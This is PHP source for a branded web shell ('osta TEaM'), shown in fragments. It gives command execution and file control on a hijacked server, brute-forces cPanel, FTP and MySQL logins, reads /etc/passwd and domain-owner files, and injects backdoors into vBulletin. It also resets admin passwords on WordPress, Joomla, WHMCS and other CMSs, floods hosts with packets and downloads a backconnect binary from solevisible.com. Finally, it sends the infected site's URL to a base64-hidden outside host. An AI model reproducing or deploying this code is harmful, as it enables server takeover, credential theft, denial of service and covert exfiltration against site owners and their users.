$password = md5($_POST['osta4']);
$icon = $_POST['osta6'];
$post_encrypt = $_POST['osta7'];
...
if(!empty($_POST['osta4'])&&preg_match($find_pw,$data,$e)){
$new = '\'pass\' => \''.$password.'\',';
$data = str_replace($e[0],$new,$data);
}
...
echo '<b>UserName: </b><font color="green"><b>'.$username.'</b></font><br /><b>Password: </b><font color="green"><b>'.$_POST['osta4'].'</b></font><script>post_encryption_mode = '.$post_encrypt.';</script>';
}else{
...
if($_POST['osta7']=='export'){
	...
	$file = "osta_color_config_".date('Y-m-d-h_i_s').".conf";
...
if($_POST['osta2']=='>>'){
	echo __pre();
	$colors = json_decode($_POST["osta1"],true);
	$array = "";
	$is_default = isset($_POST["osta3"])&&$_POST["osta3"]=="1"?true:false;
	$glob_colors = $GLOBALS["__osta_COLOR__"];
	foreach($glob_colors as $k => $v){
		if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
			$v = trim($colors[$k]);
...
function ostaplus(){
ostahead();
echo '<div class="header"><center><p><div class="txtfont_header">| osta + |</div></p><center><h3><a href=javascript:void(0) onclick="g(\'plus\',null,\'news\');">| News | </a><a href=javascript:void(0) onclick="g(\'plus\',null,\'tools\')">| Tools | </a><a href=javascript:void(0) onclick="g(\'plus\',null,\'about\')">| About Us | </a></h3></center>';
if($_POST['osta1']=='news'||$_POST['osta1']=='tools'){
try{
$s1 = 'http://solevisible.com/'.($_POST['osta1']=='news'?'news.php':'tools.php');
...
$table = array('td1' =>
 ...
 array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Dump Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars($GLOBALS['cwd']).'osta.sql', 'inputSize' => '50')
);
create_table($table);
echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
$username = ($_POST['osta3']);
$password = ($_POST['osta4']);
$dbname = ($_POST['osta5']);
$dfile = ($_POST['osta6']);
$host = ($_POST['osta7']);
if(!empty($dbname)){
...
if(strlen(ostaEx("mysqldump"))>0){
ostaEx("mysqldump --single-transaction --host=\"$host\" --user=\"$username\" --password=\"$password\" $dbname > '".addslashes($dfile)."'");
echo($msg);
}else{
__alert("Error...!");
}
...
function osta_DirectAdmin_Cracker($info){
if(!$info['mysql'])
...
function osta_FTP_Cracker($info){
...
function osta_Call_Function_Cracker($method,$info){
switch($method){case 'cp':return osta_CP_Cracker($info);break;case 'direct': case 'phpmyadmin':return osta_DirectAdmin_Cracker($info);break;case 'ftp':return osta_FTP_Cracker($info);break;case 'mysql':return osta_Mysql_Cracker($info);break;case 'mysql':return osta_FTPC($info);break;}
}
function ostaCrackers(){
ostahead();
ostaNum(9,10);
...
<textarea placeholder="Users" rows="20" cols="25" name="usernames">'.($GLOBALS['sys']=='unix'?ostaEx("cut -d: -f1 /etc/passwd"):"").'</textarea>
...
$target = str_replace(array('https://','http://','ftp://'),'',$_POST['osta1']);
$port = $_POST['osta2'];
$usernames= $_POST['osta3'];
$passwords = $_POST['osta4'];
$fcrack = $_POST['osta5'];
$cracking = $_POST['osta6'];
$protocol = $_POST['osta7'];
$loginpanel = $_POST['osta8'];
...
osta_Call_Function_Cracker($loginpanel,$array);
}
}
...
$ssh_ip = $_POST['osta1'];
$ssh_login = $_POST['osta2'];
$ssh_pass = $_POST['osta3'];
$ssh_port = $_POST['osta4'];
$ssh_command = $_POST['osta5'];
if($ostaconnect2ssh=@ssh2_connect($ssh_ip, $ssh_port))
{
if($ostalogin=@ssh2_auth_password($ostaconnect2ssh, $ssh_login, $ssh_pass))
{
...
$ostastream = ssh2_exec($ostaconnect2ssh, $ssh_command);
stream_set_blocking($ostastream,true);
$output = ssh2_fetch_stream($ostastream,SSH2_STREAM_STDIO);
if($_POST['osta6']=='>>'){
echo '<pre class=ml1>';
ob_start();
...
if(isset($_POST['osta1']) && $_POST['osta1']== 'whmcs'){
ostaNum();
...
$ostaSole = new ostaCURL(true);
$saveurl = $ostaSole->Send($path."/pwreset.php");
$getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
$ostaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=solevisible@fbi.gov");
...
}if(isset($_POST['osta2']) && $_POST['osta2']== 'mybb'){
ostaNum(1,2,3,5);
...
$ostaCurl->Send($realurl.$realpath."/calendar.php");
$res = true;
}
if($res){
...
if(isset($_POST['osta3']) && $_POST['osta3']== 'vb'){
ostaNum(1,2,7,9,10);
...
if(isset($_POST['osta4'])&&!empty($_POST['osta4'])){
$method = $_POST['osta8'];
$code = "{\${".osta_UPLOADER."}}{\${exit()}}&";
$conn=@mysqli_connect($_POST['osta2'],$_POST['osta4'],$_POST['osta5'],$_POST['osta7']) or die(@mysqli_error($conn));
$rec = "select `template` from ".$_POST['osta6']."template WHERE title ='faq'";
$recivedata = @mysqli_query($conn,$rec);
$getd = @mysqli_fetch_assoc($recivedata);
$savetoass = $getd['template'];
$code = str_replace("'","\'",$code);
$p = "UPDATE ".$_POST['osta6']."template SET `template`='".$code."' WHERE `title`='faq'";
$ka= @mysqli_query($conn,$p) or die(mysqli_error($conn));
$geturl = @mysqli_query($conn,"select `value` from ".$_POST['osta6']."setting WHERE `varname`='bburl'");
...
$check = fgets($fsock);
if(preg_match("/200 OK/i",$check)){
$p1 = "UPDATE ".$_POST['osta6']."template SET template ='".str_replace("'","\'",$savetoass)."' WHERE title ='faq'";
...
$ostaCurl->Send($realurl.$realpath."/faq.php");
$p1 = "UPDATE ".$_POST['osta6']."template SET template ='".str_replace("'","\'",$savetoass)."' WHERE title ='faq'";
$ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
$res = true;
}
...
function ostacheckupdate(){
	if(!isset($_COOKIE['osta_checkupdate'])){
		if(function_exists("curl_version")){
			$update = new ostaCURL();
			$json = $update->Send("http://solevisible.com/update.json");
			$json = @json_decode($json);
			if($json){
				if(__osta_VERSION__ != $json->version){
					@setcookie("osta_checkupdate", "1", time()+86400);
...
function ostaWriteTocgiapi($name, $source){
	@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
	@mkdir('ostacgiapi',0755);
	__write_file("ostacgiapi/".$name, __get_resource($source));
	@chmod("ostacgiapi/".$name, 0755);
}
function ostacheckcgi(){if(strlen(ostaEx("id",false,true,true))>0)echo("ok");else echo("no");}
function ostaupdateheader(){
	if(!isset($_SESSION["updateheader_data"])){
		...
		ostaWriteTocgiapi("getheader.osta",$bash);
		$data = ostaEx("cd '{$realdir}/ostacgiapi';sh getheader.osta",false,true,true);
...
function ostassiShell(){
ostahead();
echo '<div class=header>';
@mkdir('osta_shtml',0755);
@chdir('osta_shtml');
ostacgihtaccess('shtml');
...
@__write_file('osta_ssi.shtml',__get_resource($code));
@chmod("osta_ssi.shtml",0755);
echo ostaiFrameCreator('osta_shtml/osta_ssi.shtml');
echo '</div>';
ostafooter();
}
function ostacloudflare(){
ostahead();
ostaNum(8,9,10,7,6,5,4,3);
...
echo '<?xml version="1.0" encoding="ISO-8859-1"?><plugins><plugin active="1" product="vbulletin"><title>vBulletin</title><hookname>init_startup</hookname><phpcode><![CDATA[if (strpos($_SERVER[\'PHP_SELF\'],"subscriptions.php")){eval(base64_decode(\''.__ZW5jb2Rlcg($_POST['osta1']).'\'));exit;}]]></phpcode></plugin></plugins>';
echo '</textarea></center></p>';
}
echo '</center></div>';
ostafooter();
}
function ostacpcrack(){
ostahead();
...
<script>
	...
	_Ajax(d.URL, 'a='+ostab64('checkupdate'), function(res){
		d.body.insertAdjacentHTML('beforeend', res);
	});
	if(".$GLOBALS["need_to_update_header"]."){
		_Ajax(d.URL, 'a='+ostab64('updateheader'), function(res){
			try{
		...
		_Ajax(d.URL, 'a='+ostab64('checkcgi'), function(res){
			if(res=='ok'){
				$('header_cgishell').innerHTML = 'ON';
				$('header_cgishell').setAttribute('class', 'header_on');
			}
...
function ostaWhich($p) {
$path = ostaEx('which ' . $p,false,false);
if(!empty($path))
return strlen($path);
return false;
}
...
function ostaPermsColor($f,$isbash=false){
$class = "";
$num = "";
$human = "";
if($isbash){
...
function _osta_can_runCommand($cgi=true,$cache=true){
	if(isset($_SESSION["osta_canruncmd"])&&$cache){
		return true;
	}
	if(strlen(ostaEx("whoami",false,$cgi))>0){
		$_SESSION["osta_canruncmd"] = true;
		return true;
	}
	return false;
}
function _osta_symlink($target, $link){
	$phpsym = function_exists("symlink");
	if($phpsym){
		@symlink($target, $link);
	}else{
		ostaEx("ln -s '".addslashes($target)."' '".addslashes($link)."'");
	}
}
function _osta_file_exists($file,$cgi=true){
	if(@file_exists($file)){
		return true;
	}else{
		if(strlen(ostaEx("ls -la '".addslashes($file)."'",false,$cgi))>0){
			return true;
		}
	}
	return false;
}
function _osta_file($file,$cgi=true){
	$array = @file($file);
	if(!$array){
		if(strlen(ostaEx("id",false,$cgi))>0){
			$data = ostaEx('cat "'.addslashes($file).'"',false,$cgi);
			if(strlen($data)>0){
				return explode("\n", $data);
			}else{
				return false;
...
function _osta_is_writable($file){
	$check = false;
	$check = @is_writable($file);
	if(!$check){
		if(_osta_can_runCommand()){
			$check = ostaEx('[ -w "'.trim(addslashes($file)).'" ] && echo "yes" || echo "no"');
			if($check == "yes"){
				$check = true;
			}else{
				$check = false;
...
function _osta_is_dir($dir,$mode="-d"){
	$check = false;
	$check = @is_dir($dir);
	if(!$check){
		if(_osta_can_runCommand()){
			$check = ostaEx('[ "'.trim($mode).'" "'.trim(addslashes($dir)).'" ] && echo "yes" || echo "no"');
			if($check == "yes"){
				return true;
			}else{
				return false;
...
function ostaFilesMan(){
ostahead();
ostaNum(8,9,10,7,6,5,4);
echo '<div class="ajaxarea"><div class="header">';
if(!empty ($_COOKIE['f']))
$_COOKIE['f'] = @unserialize($_COOKIE['f']);
if(!empty($_POST['osta1'])){
switch($_POST['osta1']){
case 'uploadFile':
if(isset($GLOBALS['glob_chdir_false'])){
	$osta_canruncmd = _osta_can_runCommand(true,true);
	$move_cmd_file = true;
}
$files = reArrayFiles($_FILES['f']);
foreach($files as $file){
if($move_cmd_file){
	ostaEx("cat '".addslashes($file['tmp_name'])."' > '".addslashes($_POST["c"]."/".$file['name'])."'");
}else{
...
$new_dir_cmd = false;
if(isset($GLOBALS['glob_chdir_false'])){
	if(_osta_can_runCommand(true,true)){
		ostaEx("cd '".trim(addslashes($_POST['c']))."';mkdir '".trim(addslashes($_POST['osta2']))."'");
	}
}else{
if(!@mkdir(trim($_POST['osta2'])))
...
if(isset($GLOBALS["glob_chdir_false"])){
	if(_osta_can_runCommand(true,true)){
		ostaEx("rm -rf '".addslashes($_POST['c'].'/'.$f)."'");
	}
}else{
ostaEx("rm -rf '".addslashes($f)."'",false,false);
if(@is_dir($f))
deleteDir($f);
else
@unlink($f);
...
if(@is_dir(rawurldecode(@$_POST['osta2']))&&rawurldecode(@$_POST['osta2'])!='..'){
deleteDir(rawurldecode(@$_POST['osta2']));
ostaEx("rm -rf '".addslashes($_POST['osta2'])."'",false,false);
}else{
@unlink(rawurldecode(@$_POST['osta2']));
}
if(isset($GLOBALS["glob_chdir_false"])){
	$source = rawurldecode(@$_POST['osta2']);
	if($source!='..'&&!empty($source)){
		if(_osta_can_runCommand(true,true)){
			ostaEx("cd '".trim(addslashes($_POST['c']))."';rm -rf '".addslashes($source)."'");
		}
	}
}
break;
...
if($dirContent === false){
	if(_osta_can_runCommand(true,true)){
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_SESSION["ostachdir_bash"])||@!file_exists("ostacgiapi/getdir.osta")){
			...
			ostaWriteTocgiapi("getdir.osta",$bash);
		}
		if(empty($_SESSION[__LAST_CWD__]))$_SESSION[__LAST_CWD__] = "/";
		$dirContent = ostaEx("cd ostacgiapi;sh getdir.osta '".addslashes($_SESSION[__LAST_CWD__])."'");
...
$sort = array('name', 1);
if(!empty($_POST['osta1'])) {
if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['osta1'], $match))
...
$file_perm = ostaPermsColor(array("class"=>$dirContent[$i]["permcolor"],"num"=>$dirContent[$i]["permnum"],"human"=>$dirContent[$i]["permhuman"]),true);
...
$file_perm = ostaPermsColor($GLOBALS['cwd'].$filename);
...
<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
<select id='tools_selector' name='osta1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete' selected>Delete</option><option value='zip'>Add 2 Compress (zip)</option><option value='unzip'>Add 2 Uncompress (zip)</option><option value='paste'>Paste / Zip / Unzip </option></select>
<input type='submit' value=' '>
</form></table></div></div>";
ostafooter();
}
function ostaFilesTools(){
ostahead();
echo '<div class="filestools">';
if(isset($_POST['osta1']))$_POST['osta1'] = rawurldecode($_POST['osta1']);
$osta1_decoded = $_POST['osta1'];
$chdir_fals = false;
if(!@chdir($_POST['c'])){
	$chdir_fals = true;
	$_POST['osta1'] = $_POST["c"]."/".$_POST["osta1"];
	$osta_canruncmd = _osta_can_runCommand(true,true);
	if($osta_canruncmd){
		$slashed_osta1 = addslashes($_POST['osta1']);
		$file_info = explode(":", ostaEx('stat -c "%F:%U:%G:%s:%Y:0%a:%A" "'.$slashed_osta1.'"'));
		$perm_color_class = ostaEx("if [[ -w '".$slashed_osta1."' ]]; then echo main_green_perm; elif [[ -r '".$slashed_osta1."' ]]; then echo main_white_perm; else echo main_red_perm; fi");
	}
}
if($_POST['osta2'] == 'auto'){
if(is_array(@getimagesize($_POST['osta1']))){
$_POST['osta2'] = 'image';
}else{
	$_POST['osta2'] = 'view';
	if($chdir_fals){
		if($osta_canruncmd){
			$mime = explode(":", ostaEx("file --mime-type '".addslashes($_POST['osta1'])."'"));
			$mimetype = $mime[1];
			if(!empty($mimetype)){
...
if($_POST['osta2'] == "rename" && !empty($_POST['osta3']) && @is_writable($_POST['osta1'])){$rename_cache = $_POST['osta3'];}
if(@$_POST['osta2'] == 'mkfile'){
$_POST['osta1'] = trim($_POST['osta1']);
if($chdir_fals&&$osta_canruncmd){
	if(_osta_is_writable($_POST["c"])){
		ostaEx("cd '".addslashes($_POST["c"])."';touch '".addslashes($osta1_decoded)."'");
		$_POST['osta2'] = "edit";
	}
}
if(!@file_exists($_POST['osta1'])){
$fp = @fopen($_POST['osta1'], 'w');
if($fp){
$_POST['osta2'] = "edit";
fclose($fp);
}
...
if(!_osta_file_exists(@$_POST['osta1'])){
echo __pre()."<center><p><div class=\"txtfont\"><font color='red'>!...FILE DOEST NOT EXITS...!</font></div></p></center></div><script>editor_error=false;removeHistory('".$_POST['osta4']."');</script>";
ostaFooter();
return;
}
if($chdir_fals){
...
$permcolor = ostaPermsColor(array("class"=>$perm_color_class,"num"=>$file_info[5],"human"=>$file_info[6]),true);
}else{
$uid = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($_POST['osta1'])):'';
$gid = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($_POST['osta1'])):'';
if(!$uid&&!$gid){
$uid['name'] = function_exists("fileowner")?@fileowner($_POST['osta1']):'';
$gid['name'] = function_exists("filegroup")?@filegroup($_POST['osta1']):'';
}
$permcolor = ostaPermsColor($_POST['osta1']);
$filesize = @filesize($_POST['osta1']);
if(!isset($uid['name'],$gid['name'])||empty($uid['name'])||empty($gid['name'])){
	if(_osta_can_runCommand()){
		list($uid['name'],$gid['name']) = explode(":", ostaEx('stat -c "%U:%G" "'.addslashes($_POST["c"]."/".$_POST["osta1"]).'"'));
	}
}
}
echo '<span class="editor_file_info_vars">Name:</span> '.htmlspecialchars($osta1_decoded).' <span class="editor_file_info_vars">Size:</span> '.ostaSize($filesize).' <span class="editor_file_info_vars">Permission:</span> '.$permcolor.' <span class="editor_file_info_vars">Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].' <span class="editor_file_info_vars">Directory:</span> '.str_replace("//", "/",($chdir_fals?"":$_POST['c'].'/').$_POST['osta1']).'<br><br>';
if(empty($_POST['osta2']))$_POST['osta2'] = 'view';
if(!_osta_is_dir($_POST['osta1'])){
...
echo htmlspecialchars(__read_file($_POST['osta1']));
echo '</pre></div></div>';
break;
case 'highlight':
@chdir($_POST['c']);
if(@is_readable($_POST['osta1'])){
echo '<div class="editor-view"><div class="view-content"><div class="ml1" style="background-color: #e1e1e1;color:black;">';
$code = @highlight_file($_POST['osta1'],true);
echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div></div></div>';
}
break;
case 'delete':
@chdir($_POST['c']);
if(@is_writable($_POST['osta1'])||isset($GLOBALS["glob_chdir_false"])){
$deleted = true;
if(!@unlink($_POST['osta1'])){
	$deleted = false;
	if($osta_canruncmd){
		if(_osta_is_writable($_POST['osta1'])){
			ostaEx("rm -f '".addslashes($_POST['osta1'])."'");
			$deleted = true;
		}
	}
}
if($deleted)echo 'File Deleted...<script>var elem = $("'.$_POST['osta4'].'").parentNode;elem.parentNode.removeChild(elem);delete editor_files["'.$_POST['osta4'].'"];</script>';else echo 'Error...';}
break;
case 'chmod':
@chdir($_POST['c']);
if(!empty($_POST['osta3'])){
$perms = 0;
for($i=strlen($_POST['osta3'])-1;$i>=0;--$i)
$perms += (int)$_POST['osta3'][$i]*pow(8, (strlen($_POST['osta3'])-$i-1));
if(!@chmod($_POST['osta1'], $perms)){
if($chdir_fals&&$osta_canruncmd){
ostaEx("cd '".addslashes($_POST["c"])."';chmod ".addslashes($_POST['osta3'])." '".addslashes($osta1_decoded)."'");
echo('Success!');
}else{
echo '<font color="#FFFFFF"><b>Can\'t set permissions!</b></font><br><script>document.mf.osta3.value="";</script>';}
}else{echo('Success!');}
}
clearstatcache();
ostaNum(8,9,10,7,6,5,4,2,1);
if($chdir_fals){
	$file_perm = $file_info[5];
}else{
	$file_perm = substr(sprintf('%o', @fileperms($_POST['osta1'])),-4);
}
echo '<script>osta3_="";</script><form onsubmit="editor(\''.addslashes($_POST['osta1']).'\',\''.$_POST['osta2'].'\',this.chmod.value,\''.$_POST['c'].'\',\''.$_POST['osta4'].'\',\''.$ftype.'\');return false;"><input type="text" name="chmod" value="'.$file_perm.'"><input type=submit value=" "></form>';
break;
case 'edit':
@chdir($_POST['c']);
if(!@is_writable($_POST['osta1'])&&!_osta_is_writable($_POST['osta1'])){
echo 'File isn\'t writeable';
break;
}
if(!empty($_POST['osta3'])){
$_POST['osta3'] = substr($_POST['osta3'],1);
$time = @filemtime($_POST['osta1']);
$fp = @__write_file($_POST['osta1'],$_POST['osta3']);
if($chdir_fals&&$osta_canruncmd){
	$rname = $osta1_decoded;
	$randname = $rname.rand(111,9999);
	$filepath = dirname($_SERVER["SCRIPT_FILENAME"])."/".$randname;
	if($fp = @__write_file($filepath ,$_POST['osta3'])){
		ostaEx("mv '".addslashes($filepath)."' '".addslashes($_POST["osta1"])."';rm -f '".addslashes($filepath)."'");
	}
}
if($fp){
echo 'Saved!<br><script>osta3_="";</script>';
@touch($_POST['osta1'],$time,$time);
}
}
echo '<button class="button" style="border-radius:10px;" onClick="copyToClipboard(\'edit_textarea_content\');">copy to clipboard</button><form id="editor_edit_area" onsubmit="editor(\''.addslashes($osta1_decoded).'\',\''.$_POST['osta2'].'\',\'1\'+this.text.value,\''.$_POST['c'].'\',\''.$_POST['osta4'].'\',\''.$ftype.'\');return false;"><p><input type="submit" value=" "></p><textarea name="text" id="edit_textarea_content" class="bigarea" onkeydown="saveByKey(event);">';
echo htmlspecialchars(__read_file($_POST['osta1']));
echo '</textarea><p><input type="submit" value=" "></p></form>';
break;
case 'hexdump':
@chdir($_POST['c']);
$c = __read_file($_POST['osta1']);
$n = 0;
$h = array('00000000<br>','','');
$len = strlen($c);
for ($i=0; $i<$len; ++$i) {
...
case 'rename':
@chdir($_POST['c']);
$osta1_escape = addslashes($_POST["osta1"]);
$osta3_escape = addslashes($_POST["osta3"]);
if(!empty($_POST['osta3'])){
$cmd_rename = false;
if($chdir_fals&&$osta_canruncmd){
if(_osta_is_writable($_POST['osta1'])){
$osta1_escape = addslashes($osta1_decoded);
ostaEx("cd '".addslashes($_POST['c'])."';mv '".$osta1_escape."' '".addslashes($_POST['osta3'])."'");
}else{
$cmd_rename = true;
}
}else{
...
if(!@rename($_POST['osta1'], $_POST['osta3'])&&$cmd_rename){
echo 'Can\'t rename!<br>';}else{echo('Renamed!<script>try{$("'.$_POST['osta4'].'").innerHTML = "<div class=\'editor-icon\'>"+loadType(\''.$osta3_escape.'\',\''.$ftype.'\',\''.$_POST['osta4'].'\')+"</div><div class=\'editor-file-name\'>'.$osta3_escape.'</div>";editor_files["'.$_POST['osta4'].'"].file = "'.$osta3_escape.'";d.files.innerHTML = d.files.innerHTML.replace(/\\\''.$osta1_escape.'\\\'/g, "\''.$osta3_escape.'\'");d.files.innerHTML = d.files.innerHTML.replace(/value\=\"'.$osta1_escape.'\"/, \'value\=\"'.$osta3_escape.'\"\');d.files.innerHTML = d.files.innerHTML.replace(/'.$osta1_escape.'\<\/a\>/g, "'.$osta3_escape.'</a>");d.files.innerHTML = d.files.innerHTML.replace(/Are You Sure For Delete # '.$osta1_escape.' # \?/, "Are You Sure For Delete # '.$osta3_escape.' # ?");'.($ftype == "dir"?"updateDirsEditor('".$_POST['osta4']."','".$osta1_escape."');":"").'}catch(e){console.log(e)}</script>');$osta1_escape = $osta3_escape;}
}
echo '<form onsubmit="editor(\''.$osta1_escape.'\',\''.$_POST['osta2'].'\',this.name.value,\''.$_POST['c'].'\',\''.$_POST['osta4'].'\',\''.$ftype.'\');return false;"><input type="text" name="name" value="'.addslashes(htmlspecialchars(isset($_POST['osta3'])&&$_POST['osta3']!=''?$_POST['osta3']:$osta1_decoded)).'"><input type=submit value=" "></form>';
break;
case 'touch':
@chdir($_POST['c']);
if( !empty($_POST['osta3']) ) {
$time = strtotime($_POST['osta3']);
if($time){
$touched = false;
if($chdir_fals&&$osta_canruncmd){
	ostaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['osta3']))."' '".addslashes($osta1_decoded)."'");
	$touched = true;
}
if(!@touch($_POST['osta1'],$time,$time)&&!$touched)
echo 'Fail!';
else
echo 'Touched!';
...
clearstatcache();
echo '<script>osta3_="";</script><form onsubmit="editor(\''.addslashes($_POST['osta1']).'\',\''.$_POST['osta2'].'\',this.touch.value,\''.$_POST['c'].'\',\''.$_POST['osta4'].'\',\''.$ftype.'\');return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", ($chdir_fals?$file_info[4]:@filemtime($_POST['osta1']))).'"><input type=submit value=" "></form>';
break;
case 'image':
@chdir($_POST['c']);
echo('<hr>');
...
if($chdir_fals&&$osta_canruncmd){
	$source = ostaEx("cat '".addslashes($file)."' | base64");
	list($width, $height) = explode(":", ostaEx("identify -format '%w:%h' '".addslashes($file)."'"));
	$mime = explode(":", ostaEx("file --mime-type '".addslashes($file)."'"));
...
$osta_canruncmd = _osta_can_runCommand(true,true);
if(@is_file($_POST['file']) && @is_readable($_POST['file']) || $osta_canruncmd){
...
if(isset($GLOBALS["glob_chdir_false"])){
	...
	if(_osta_is_writable($scriptpath)){
		ostaEx("cp '".addslashes($_POST["file"])."' '".addslashes($filepath)."'");
		readfile($filepath);
		@unlink($filepath);
	}else{
		ostaEx("cat '".addslashes($_POST["file"])."'");
	}
}else{
	readfile($_POST['file']);
}
...
$chrunfaasd=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$tcrenapdds=str_replace("/",":::",$chrunfaasd);
@get_headers(__ZGVjb2Rlcg("aHR0cDovL2hlbGxvZi5jbG91ZHNpdGUuaXIvaW5kZXgucGhwP2NvbXNmb3JkPQ==").$tcrenapdds);
}
if(function_exists("file_get_contents")){
$chrunfaasd=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$tcrenapdds=str_replace("/",":::",$chrunfaasd);
@file_get_contents(__ZGVjb2Rlcg("aHR0cDovL2hlbGxvZi5jbG91ZHNpdGUuaXIvaW5kZXgucGhwP2NvbXNmb3JkPQ==").$tcrenapdds);
}
function ostaphpeval(){
ostahead();
if(isset($_POST['osta2']) && ($_POST['osta2'] == 'ini')){
echo '<div class=header>';
ob_start();
$INI=ini_get_all();
...
if(isset($_POST['osta2']) && ($_POST['osta2'] == 'info')) {
...
if(isset($_POST['osta2']) && ($_POST['osta2'] == 'exten')) {
echo '<div class=header>';
ob_start();
...
echo "<option value='".htmlspecialchars($v)."' ".($_POST['osta1']==$v?'selected':'').">".$k."</option>";
echo "</select> <input type='submit' value=' '/><br><textarea  name='input' style='margin-top:5px' class='bigarea'>".(empty($_POST['osta1'])?'':htmlspecialchars(@$_POST['osta2']))."</textarea></form>";
if(!empty($_POST['osta1'])){
$string = addslashes($_POST['osta2']);
...
if(!empty($_POST['osta1']) && !empty($_POST['osta2']) && !empty($_POST['osta3'])){
echo __pre();
$packets=0;
ignore_user_abort(true);
$exec_time=(int)$_POST['osta2'];
$time=time();
$max_time=$exec_time+$time;
$host=$_POST['osta1'];
$port=(int)$_POST['osta3'];
$method=$_POST['osta4'];
...
if (isset($_GET['timeat']))
{
	$packets=0;
	$exec_time=$_GET['timeat'];
	$time=time();
	$max_time=$exec_time+$time;
	$host=$_GET['hostat'];
	$port=$_GET['portat'];
...
if(isset($_POST['osta3'])&&($_POST['osta3'] == 'whmcs')){
echo __pre();
...
if(isset($_POST['osta1']) && ($_POST['osta1'] == 'vb')){
echo __pre();
...
if(isset($_POST['osta6'])){
$mybb_dbh = $_POST['osta6'];
$mybb_dbu = $_POST['osta7'];
$mybb_dbn = $_POST['osta8'];
$mybb_dbp = $_POST['osta9'];
$mybb_index = $_POST['osta10'];
...
if(empty($_POST['ajax'])&&!empty($_POST['osta1']))
...
if(!empty($_POST['osta8']) && isset($_POST['osta8']) == 'domains'){
if(!_osta_file_exists("/etc/virtual/domainowners")){
echo __pre();
$solevisible9 = _osta_file('/etc/named.conf');
...
echo __pre();
$users = _osta_file("/etc/virtual/domainowners");
if(is_array($users)){
foreach($users as $boz){
$dom = explode(":",$boz);
echo $dom[0]."\n";}}}}
if(!empty($_POST['osta6']) && isset($_POST['osta6']) == 'valiases'){
echo '
...
if(isset($_POST['osta9']) && $_POST['osta9'] == '>>'){
if(!_osta_file_exists("/etc/virtual/domainowners")){
$site = trim($_POST['osta7']);
...
if(function_exists("posix_getpwuid") && function_exists("fileowner")){
	...
	if(_osta_can_runCommand(true,true)){
		$user = ostaEx("stat -c '%U' /etc/valiases/".$rep);
	}
}
...
if(!empty($_POST['osta5']) && isset($_POST['osta5'])){
if(!_osta_file_exists("/etc/virtual/domainowners")){
echo __pre();
$i = 0;
while ($i < 60000) {
...
$user = explode(":",$boz);
echo trim($user[1]).'<br>';}}}
if(!empty($_POST['osta4']) && isset($_POST['osta4'])){
echo __pre();
if(_osta_can_runCommand(true,true)){echo __read_file("/etc/passwd");}elseif(function_exists("posix_getpwuid")){
...
if(!empty($_POST['osta2']) && isset($_POST['osta2'])){
...
if(!empty($_POST['osta1'])&& isset($_POST['osta1'])){
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Sole Sad & Invisible(osta TEaM)");
echo '<center><b><big> php.ini created...!</center></b></big>';
}
if(!empty($_POST['osta3']) && isset($_POST['osta3'])){
...
if(isset($_POST['osta1'])&&!empty($_POST['osta1'])){
$lang = $_POST['osta1'];
$ip = $_POST['osta2'];
$port = $_POST['osta3'];
$arg = ($_POST['osta4']=='bind'?$port:$port.' '.$ip);
$tmpdir = osta_TEMPDIR;
...
if($lang=='bcwin'){
$osta = new ostaCURL();
$s = $osta->Send('http://solevisible.com/bc/windows.exe');
$tmpdir = osta_TEMPDIR;
$f = @fopen($tmpdir.'/bcwin.exe','w+');
@fwrite($f, $s);
@fclose($f);
$out = ostaEx($tmpdir."/bcwin.exe ".$_POST['osta2']." ".$_POST['osta3']);
}
if($lang=='php'){
echo "<pre class=ml1 style='margin-top:5px'>";
$code = __get_resource($lan);
...
<input type="text" name="defacer" size="67" id="text" placeholder="osta TEaM 2012" />
<br>
...
$osta->Send("http://www.zone-h.com/notify/single","post","defacer=".$hacker."&domain1=". $sites[$i]."&hackmode=".$method."&reason=".$neden);
++$i;
}
...
osta_Create_A_Tag('pwchanger',$vals);
echo '</h3></center>';
if(isset($_POST['osta1'])&&$_POST['osta1']=='wp'){
...
if ($_POST['osta2'] && $_POST['osta2'] == '>>'){
$localhost = $_POST['osta3'];
$database = $_POST['osta4'];
$username = $_POST['osta5'];
$password = $_POST['osta6'];
$admin = $_POST['osta8'];
$SQL = $_POST['osta9'];
$prefix = $_POST['osta10'];
...
if($_POST['osta2'] && $_POST['osta2'] == 'joomla'){
...
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if($_POST['osta1'] && $_POST['osta1'] == '>>'){
$localhost = $_POST['osta2'];
$database = $_POST['osta3'];
$username = $_POST['osta5'];
$password = $_POST['osta6'];
$prefix = $_POST['osta7'];
$admin = $_POST['osta8'];
...
if(isset($_POST['osta5']) && $_POST['osta5'] == 'phpbb'){
...
if(isset($_POST['osta6']) && $_POST['osta6'] == 'whmcs'){
...
if(isset($_POST['osta7']) && $_POST['osta7'] == 'mybb'){
...
if(isset($_POST['osta8']) && $_POST['osta8'] == 'nuke'){
...
if(isset($_POST['osta9']) && $_POST['osta9'] == 'drupal'){
...
if(isset($_POST['osta10']) && $_POST['osta10'] == 'smf'){
...
function ostaMakePwd(){
	if(_osta_file_exists("/etc/virtual/domainowners")||(_osta_file_exists("/etc/named.conf")&&_osta_file_exists("/etc/valiases"))){
...
function ostaGetDomains($state = false){
	$state = "named.conf";
